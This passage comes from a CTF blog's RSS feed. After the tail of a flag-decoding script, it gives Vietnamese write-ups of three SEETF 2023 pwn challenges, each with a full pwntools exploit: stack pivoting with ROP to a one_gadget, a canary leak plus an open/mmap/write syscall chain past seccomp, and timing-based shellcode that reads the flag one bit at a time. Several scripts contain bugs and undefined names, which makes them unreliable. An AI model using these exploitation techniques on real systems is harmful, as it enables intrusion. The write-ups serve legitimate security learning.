</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">217</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">230</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dec_flag <span style="color:#f92672">=</span> bytearray(base64<span style="color:#f92672">.</span>b64decode(enc_flag))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>map<span style="color:#f92672">=</span>{val: idx <span style="color:#66d9ef">for</span> idx, val <span style="color:#f92672">in</span> enumerate(key)}
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        dec_flag <span style="color:#f92672">=</span> bytearray(map[byte] <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> dec_flag)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">=</span>bytes(dec_flag)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{Nice_but_your_nightmare_has_just_started}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>SEETF 2023</title>
      <link>https://w1n-gl0ry.github.io/posts/seetf/</link>
      <pubDate>Mon, 12 Jun 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/seetf/</guid>
      <description><![CDATA[<h1 id="seetf-2023">SEETF 2023</h1>
<p>Some challs in pwns category that I have solved
Author: lawliet From phis1Ng_</p>
<h1 id="great---expectations">Great - Expectations</h1>
<p><code>Description: Ask no questions, and you'll be told no lies. </code></p>
<p>Ở bài này, trong hàm <code>input_floats()</code> có khai báo mảng buf kiểu char với (3 bytes), nhưng có lỗi khi format nhập vào là %f (4 bytes), nên từ 3 lần ghi đề cho, ta có thể đè nhiều nhất 3 bytes xuống canary (kí tự &lsquo;A&rsquo;) và 2 bytes của saved_rbp của hàm main. Vì vậy, í tưởng ở đây là ta ghi đè 1 byte (hoặc 2 bytes) của saved_rbp để khiến cho ret trỏ tới chuỗi mà ta mong muốn. Đầu chương trình cho ta nhập nhiều nhất 0x107 kí tự, nên ta có thể pivot stack đến đó, để khiến ret trỏ tới chuỗi payload mà ta muốn.
Để không phải leak libc rồi quay lại hàm main 1 lần nữa thì vì chúng ta có thể ghi đè lên bảng GOT nên ý tưởng của em là dùng ROP để thay đổi địa chỉ của hàm nào đó về one_gadgets, vì offset giữa 2 hàm trong libc luôn cố định nên ta có thể dùng gadget <code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code> để cộng/trừ offset sao cho địa chỉ đó trỏ tới one_gadget</p>
<p>Ta thấy nửa byte đầu của bytes thứ 2 sau LSB của saved_rbp chỉ cách 1 đơn vị so với địa chỉ của buffer mà chương trình cho ta nhập vào. Hơn nữa, byte cuối luôn kết thúc bằng 0x00, 0x10, &hellip;, 0xf0 . Nên ta có cơ hội 1/16 để pivot stack về buffer, xong cộng 1 để bypass check [rbp-1] với A.</p>
<p><strong>Solve scripts</strong></p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">#!/usr/bin/env python3
from pwn import *
import time
import sys
import struct

local = 0
debug = 0

context.arch = &#39;amd64&#39;
# context.aslr = False
context.log_level = &#39;debug&#39;
# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in (&#39;-l&#39;, &#39;--local&#39;):
			local = 1
		if arg in (&#39;-d&#39;, &#39;--debug&#39;):
			debug = 1

	if local:
		io = process(&#39;./chall_patched&#39;)
		if debug:
			gdb.attach(s, gdbscript=&#39;&#39;&#39;
            b* 0x00000000004012ae
            b* 0x00000000004011fc
            c
			&#39;&#39;&#39;)
		else:
			pass
	else:
		io = remote(&#39;win.the.seetf.sg&#39;, 2004)

	return io


elf = ELF(&#39;./chall_patched&#39;)
libc = ELF(&#39;libc.so.6&#39;)


pop_rdi = 0x0000000000401313
pop_rsi_r15 = 0x0000000000401311
leave_ret = 0x000000000040122c
pop_rbp = 0x000000000040119d
ret = 0x000000000040101a
main = 0x000000000040122e
main_no_push = main+1
input_floats = 0x00000000004011b6
put_gots = 0x404018
csu = 0x40130a
add_what_where = 0x000000000040119c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret


def hex_to_float(hex_str):
    binary_str = bytes.fromhex(hex_str)
    unpacked = struct.unpack(&#39;!f&#39;, binary_str)
    return unpacked[0]

try:
	io = riconn()
	payload = 0x61*b&#39;A&#39; + 8*b&#39;A&#39; + p64(csu) + p64(0x5f6de) + p64(put_gots+0x3d) + p64(0)*4 + p64(add_what_where) + p64(elf.sym[&#39;puts&#39;])
	value = &#39;3.544850151698461e-38&#39;
	io.sendafter(b&#39;ale.\n&#39;,payload)
	io.sendlineafter(b&#39;number!\n&#39;, b&#39;1&#39;)
	io.sendlineafter(b&#39;number!\n&#39;, value.encode())
	io.sendlineafter(b&#39;number!\n&#39;, b&#39;+&#39;)	
	io.interactive()

except:
    io.close()
</code></pre><p><strong>$ flag:</strong> SEE{Im_f33ling_1ucky_e27e006fe918ab56}</p>
<h1 id="mmap-note">Mmap note</h1>
<p><code>Description: I made a basic note program but with sandbox. And no more chunk for house of xxx. Can you still get the flag?</code></p>
<p>Ở bài này, chúng ta có thể allocate 1 số chunks với size 0x1000. Nếu phân bổ hết lượng bộ nhớ trên Heap và khiến cho chunks mới phải dùng mmaped(). Điều đó khiến ta có 1 số chunk nằm trên Thread Local Storage (TLS) được đặt với 1 offset không đổi so với libc trong vùng nhớ.</p>
<pre tabindex="0"><code>__int64 write_0()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf(&#34;idx = &#34;);
  __isoc99_scanf(&#34;%d&#34;, &amp;v1);
  if ( v1 &lt; dword_404590 )
  {
    printf(&#34;size to write = &#34;);
    __isoc99_scanf(&#34;%d&#34;, &amp;sizes[v1]);
    if ( sizes[v1] &lt;= 4096 )
    {
      read(0, (void *)chunk[v1], sizes[v1]);
      return 1LL;
    }
    else
    {
      puts(&#34;too much&#34;);
      return 0LL;
    }
  }
  else
  {
    puts(&#34;invalid idx&#34;);
    return 0LL;
  }
}
</code></pre><p>Lỗi thứ 2 ở hàm write(), ta thấy lỗi integer overflow, nên chúng ta có thể đọc nhiều hơn 0x1000 bytes. Điều này cho phép ta có thể đọc được cả canary được lưu giữ trong 1 offset cố định trên TLS (vì hàm write in ra cả nullbyte).
Sau đó, chúng ta dùng để dùng rop chain open-&gt;read-&gt;write để ánh xạ file flag vào bộ nhớ chương trình và xuất nó ra thiết bị xuất chuẩn.</p>
<p>OOPs, chúng ta lại không có read() để đọc file vào bộ nhớ (vì chương trình đã dùng seccomp để chặn các hàm đó lại). May mắn thay, em tìm thấy bài viết này <a href="https://stackoverflow.com/questions/74743307/mmap-open-and-read-from-file">link</a>. Dùng mmap() để read() file. Ok, vậy mọi thứ đã rõ ràng rồi, mình tiến hành exploit:</p>
<p><strong>Solve scripts</strong></p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">#!/usr/bin/env python3

from pwn import *
from ctypes import *
import time
import sys

local = 0
debug = 0

context.arch = &#39;amd64&#39;
# context.aslr = False
# context.log_level = &#39;debug&#39;
# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in (&#39;-l&#39;, &#39;--local&#39;):
			local = 1
		if arg in (&#39;-d&#39;, &#39;--debug&#39;):
			debug = 1

	if local:
		io = process(&#39;./chall_patched&#39;)
		if debug:
			gdb.attach(s, gdbscript=&#39;&#39;&#39;
            b* 0x0000000000401930
            b* 0x0000000000401953
            continue
			&#39;&#39;&#39;)
		else:
			raw_input(&#39;DEBUG&#39;)
	else:
		io = remote(&#39;win.the.seetf.sg&#39;, 2002)

	return io

io = conn()

elf = ELF(&#39;./chall_patched&#39;)
libc = ELF(&#39;libc.so.6&#39;)

pop_rax = 0x0000000000401491
pop_rdi = 0x000000000040148f
pop_rsi = 0x0000000000401493
pop_rsp = 0x00000000004014a0
pop_r10 = 0x0000000000401497
pop_r8 = 0x000000000040149a
pop_r9 = 0x000000000040149d
pop_rdx = 0x0000000000401495

sys_call = 0x00000000004014a8

# Stage 1 : Leak canary and Libc :
    
def create_note():
    io.sendlineafter(b&#39;&gt; &#39;, b&#39;1&#39;)

def write_note(idx, size=0x1000):
    io.sendlineafter(b&#39;&gt; &#39;, b&#39;2&#39;)
    io.sendlineafter(b&#39;idx = &#39;, str(idx).encode())
    io.sendlineafter(b&#39;size to write = &#39;, f&#34;{size}&#34;.encode())

def read_note(idx):
    io.sendlineafter(b&#39;&gt; &#39;, b&#39;3&#39;)
    io.sendlineafter(b&#39;idx = &#39;, str(idx).encode())


for i in range(30):
    create_note()
    if i ==0:
        p.recvuntil(b&#34;Addr of note 0 is 0x&#34;)
        addr_0=int(p.recvuntil(b&#34;\n&#34;).rstrip().decode(),16)
    sleep(0.1)

write_note(0, size=100, b&#39;flag\0&#39;)
write_note(3, size=0x1740+0x100) 
read_note(3)

for i in range(0x10):
	io.recv(0x100)
	log.info(&#34;&#34;)
	sleep(0.5)

sleep(1)
io.recv(0x760+9-1)
sleep(1)
canary = u64(io.recv(8))
log.info(f&#34;canary = {hex(canary)}&#34;)

payload = b&#39;A&#39;*24 // fill buff and saved_rbp
payload += flat(pop_rax, 2, pop_rdi, base+0xf00, pop_rsi, 0, pop_rdx, 0,\
                syscall_ret, pop_rax, 9, pop_rdi, 0x13370000, pop_rsi, 0x1000,\ # open
                pop_rdx, 7, pop_r10, 2, pop_r8, 3, pop_r9, 0, syscall_ret,\  # mmap
                pop_rax, 1, pop_rdi, 1, pop_rsi, 0x13370000, pop_rdx, 0x40, syscall_ret) # write

io.sendline(payload)
io.sendline(b&#39;4&#39;)
io.interactive()
</code></pre><p><strong>$ flag:</strong> SEE{m4st3r_0f_mm4p_5ee2a719bc6a8209e7295d4095ff5181}</p>
<h1 id="shellcode-as-a-service">Shellcode As A Service</h1>
<p><code>Description: Hey, welcome to my new SaaS platform! As part of our early access program, we are offering the service for FREE. Our generous free tier gives you a whole SIX BYTES of shellcode to run on our server. What are you waiting for? Sign up now!</code></p>
<p>Như chương trình đã mô tả, chúng ta phải viết shellcode sẽ được đưa vào để thực thi.
Được cấp cho 6 bytes và có cho phép 2 syscall open, read, ngăn chặn chúng ta in flag ra màn hình. Ý tưởng là chúng ta sẽ viết 1 vòng lặp để kiểm tra từng bit của flag, nếu bit bằng 1 sẽ cho vào 1 vòng lặp, còn ngược lại thì bit bằng 0.
Một cách khác là ta sẽ đọc từng bytes của flag rồi kiểm tra từng kí tự của flag.</p>
<p>Ngay lúc này, thanh ghi rdi đang có giá trị bằng 0, rdx thì là địa chỉ nơi mà shellcode chúng ta ghi nên chúng ta chỉ cần lấy giá trị đó là đủ để ghi tiếp (second stage write).</p>
<p><strong>Solve scripts</strong></p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">from pwn import *
import struct

#!/usr/bin/env python3

from pwn import *
from ctypes import *
import time
import sys

local = 0
debug = 0

context.arch = &#39;amd64&#39;
# context.aslr = False
# context.log_level = &#39;debug&#39;
# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in (&#39;-l&#39;, &#39;--local&#39;):
			local = 1
		if arg in (&#39;-d&#39;, &#39;--debug&#39;):
			debug = 1

	if local:
		io = process(&#39;./chall&#39;)
		if debug:
			gdb.attach(s, gdbscript=&#39;&#39;&#39;
			&#39;&#39;&#39;)
		else:
			raw_input(&#39;DEBUG&#39;)
	else:
		io = remote(&#39;103.162.14.240&#39;, 15001)

	return io


elf = ELF(&#39;./chall&#39;)
#libc = ELF(&#39;libc.so.6&#39;)

def chill(offset):
    bin = &#39;&#39;
    for bit in range(8):
        io = riconn()
        stage1 = asm(f&#34;&#34;&#34;
        xor edi, edi
        mov esi, edx
        syscall
        &#34;&#34;&#34;, arch=&#39;amd64&#39;)

        io.send(stage1)

        stage2 = asm((&#34;&#34;&#34;
        .rept 0x6
        nop
        .endr
        &#34;&#34;&#34; 
            + shellcraft.amd64.linux.open(&#39;/flag&#39;)
            + shellcraft.amd64.linux.read(&#39;rax&#39;, &#39;rsp&#39;, 0x100)
            + f&#34;&#34;&#34;
            xor r11, r11
            xor rax, rax
            mov al, [rsp+{offset}]
            shr al, {bit}
            shl al, 7
            shr al, 7
        loop:
            cmp rax, r11
            je end
            jmp loop
        end:
        &#34;&#34;&#34;
        ), arch=&#39;amd64&#39;)

        io.send(stage2)
        start = time.time()
        io.recvall(timeout=1).decode()
        now = time.time()

        if (now - start) &gt; 1:
            bin += &#39;1&#39;
        else:
            bin += &#39;0&#39;

    byte = int(bin[::-1], 2)

    return byte


tmp = []
for i in range(100):
    tmp.append(chill(i))
    if tmp[-1] == &#39;}&#39;:
        break
    
flag = [x.decode(&#39;utf-8&#39;) for x in tmp]
flag = &#39;&#39;.join(flag)
</code></pre><p><strong>$ flag:</strong> SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
